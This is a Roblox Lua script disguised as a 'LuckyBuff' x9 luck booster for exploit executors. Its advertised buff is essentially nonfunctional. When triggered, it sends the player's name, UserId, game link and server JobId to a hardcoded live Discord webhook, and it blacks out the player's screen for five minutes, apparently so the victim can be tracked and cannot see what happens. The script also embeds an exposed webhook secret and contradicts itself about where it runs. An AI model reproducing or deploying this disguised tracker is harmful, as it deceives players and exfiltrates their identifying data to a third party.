-- LuckyBuff System (All Executor Support)
-- Made by: toxic_white
-- Lưu ý: Đặt trong ServerScriptService

local BUFF_MULTIPLIER = 9
local BUFF_DURATION = 3600
local COOLDOWN = 7200
local BLACKSCREEN_DURATION = 300
local WEBHOOK_URL = "https://discord.com/api/webhooks/1401785416104939720/6LU4HbxLm8mwoS8iZ0LrbwBmZ1Wp6clskoXsEGtnymrKNLVDTeVPZbpeBKKom9wrWG6Z"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")

local REMOTE_NAME = "RequestLuckyBuff"
local remote = ReplicatedStorage:FindFirstChild(REMOTE_NAME) or Instance.new("RemoteEvent")
remote.Name = REMOTE_NAME
remote.Parent = ReplicatedStorage

local cooldowns, activeBuffs = {}, {}

-- ========== Helper ==========
local function getLuckMultiplierFor(player)
    local info = activeBuffs[player.UserId]
    if info and os.time() < info.endsAt then
        return BUFF_MULTIPLIER
    end
    return 1
end
_G.RollSecretWithBuff = function(player, baseChance)
    local chance = math.min(baseChance * getLuckMultiplierFor(player), 1)
    return Random.new():NextNumber() <= chance
end

-- Webhook logger
local function sendWebhookLog(player)
    if WEBHOOK_URL == "" then return end
    local payload = {
        username = "LuckyBuff Logger",
        embeds = {{
            title = "Buff Script Activated",
            description = player.Name.." ("..player.UserId..")",
            color = 16753920,
            fields = {
                {name="Roblox Link", value="https://roblox.com/games/"..game.PlaceId, inline=true},
                {name="Server JobId", value=tostring(game.JobId), inline=false},
                {name="User", value=player.Name.." ("..player.UserId..")", inline=false}
            }
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
end

-- ========== Server Remote ==========
remote.OnServerEvent:Connect(function(player, action)
    local uid, now = player.UserId, os.time()
    if action == "Stop" then
        activeBuffs[uid] = nil
        remote:FireClient(player, "BuffOff")
        return
    end
    if cooldowns[uid] and now < cooldowns[uid] then
        remote:FireClient(player, "Cooldown", cooldowns[uid]-now)
        return
    end
    remote:FireClient(player, "ShowBlackScreen", BLACKSCREEN_DURATION)
    sendWebhookLog(player)
    activeBuffs[uid] = {endsAt=now+BUFF_DURATION}
    cooldowns[uid] = now+COOLDOWN
    remote:FireClient(player, "BuffOn", BUFF_DURATION)
    task.delay(BUFF_DURATION, function()
        activeBuffs[uid]=nil
        if player and player.Parent then remote:FireClient(player, "BuffOff") end
    end)
end)
Players.PlayerRemoving:Connect(function(p) cooldowns[p.UserId]=nil activeBuffs[p.UserId]=nil end)

-- ========== CLIENT CODE ==========
local clientSource = [[
-- LuckyBuff Client UI
pcall(function()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local player = Players.LocalPlayer
    local remote = ReplicatedStorage:WaitForChild("RequestLuckyBuff")

    local gui = Instance.new("ScreenGui")
    gui.Name = "LuckyBuffGUI"
    gui.ResetOnSpawn = false
    gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")

    local black = Instance.new("Frame")
    black.Size = UDim2.new(1,0,1,0)
    black.BackgroundColor3 = Color3.new(0,0,0)
    black.Visible = false
    black.ZIndex = 50
    black.Parent = gui

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0,360,0,180)
    card.Position = UDim2.new(0.5,-180,0.5,-90)
    card.BackgroundColor3 = Color3.fromRGB(36,36,54)
    card.Parent = gui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,34)
    title.Text = "BUFF LUCKY SV x9"
    title.TextColor3 = Color3.fromRGB(255,210,60)
    title.TextScaled = true
    title.Parent = card

    local timeLabel = Instance.new("TextLabel")
    timeLabel.Position = UDim2.new(0,10,0,60)
    timeLabel.Size = UDim2.new(1,-20,0,26)
    timeLabel.Text = "Số thời gian còn lại: 0:00"
    timeLabel.TextColor3 = Color3.new(1,1,1)
    timeLabel.TextScaled = true
    timeLabel.Parent = card

    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.new(0,120,0,38)
    toggle.Position = UDim2.new(0.5,-60,1,-46)
    toggle.Text = "ON"
    toggle.BackgroundColor3 = Color3.fromRGB(0,190,0)
    toggle.TextScaled = true
    toggle.Parent = card

    local running=false
    local function format(sec) local m=math.floor(sec/60) return m..":"..string.format("%02d",sec%60) end
    local function countdown(sec)
        running=true
        while sec>0 and running do
            timeLabel.Text="Số thời gian còn lại: "..format(sec)
            sec-=1 task.wait(1)
        end
        if running then timeLabel.Text="Hết Buff" toggle.Text="ON" toggle.BackgroundColor3=Color3.fromRGB(0,190,0) running=false end
    end

    toggle.MouseButton1Click:Connect(function()
        if not running then remote:FireServer("Start") toggle.Text="Đang khởi..." end
        if running then remote:FireServer("Stop") toggle.Text="Tắt..." end
    end)

    remote.OnClientEvent:Connect(function(cmd,data)
        if cmd=="ShowBlackScreen" then
            black.Visible=true card.Visible=false
            task.delay(tonumber(data) or 5,function() black.Visible=false card.Visible=true end)
        elseif cmd=="BuffOn" then
            running=true toggle.Text="OFF" toggle.BackgroundColor3=Color3.fromRGB(200,0,0)
            spawn(function() countdown(tonumber(data) or 0) end)
        elseif cmd=="BuffOff" then
            running=false toggle.Text="ON" toggle.BackgroundColor3=Color3.fromRGB(0,190,0) timeLabel.Text="Hết Buff"
        elseif cmd=="Cooldown" then
            toggle.Text="Cooldown.." task.wait(tonumber(data) or 0) toggle.Text="ON"
        end
    end)
end)
]]

-- auto inject for all executor
local function injectClient(plr)
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "LuckyBuffClientTemplate"
        gui.ResetOnSpawn=false
        local scr = Instance.new("LocalScript")
        scr.Name="Client"
        scr.Source=clientSource
        scr.Parent=gui
        gui.Parent=plr:WaitForChild("PlayerGui")
    end)
end

for _,pl in ipairs(Players:GetPlayers()) do injectClient(pl) end
Players.PlayerAdded:Connect(injectClient)

print("[LuckyBuff] Loaded | Support All Executor | Made by: toxic_white")
